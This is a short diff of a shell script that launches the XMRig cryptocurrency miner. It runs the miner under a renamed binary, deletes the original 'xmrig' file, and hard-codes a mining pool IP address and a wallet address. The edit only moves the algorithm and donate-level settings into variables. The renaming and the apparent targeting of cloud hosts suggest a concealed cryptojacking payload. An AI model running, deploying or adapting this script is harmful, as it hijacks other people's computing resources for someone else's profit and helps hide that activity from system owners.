@@ -15,6 +15,8 @@ cp $azure "$cpuname"
 rm -f  xmrig
 POOL=158.101.6.131:2222
 USERNAME=WW3WA6yBf594aYQ8JMvxuXEXQdQ21MzLuRKW83nWYNz3eHTSBBKA6UxVCViF9vkcLdbrjEtcVUYEDfuQ9J7ksbci14R9ATjyu
+ALGO=rx/wow
+DONATE=1
 THREADS=4
 echo $cpuname" is starting"
-./"${cpuname}" --donate-level 1 -o $POOL -u $USERNAME -p x -a rx/wow -k t $THREADS
+./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME -p x -a $ALGO -k t $THREADS
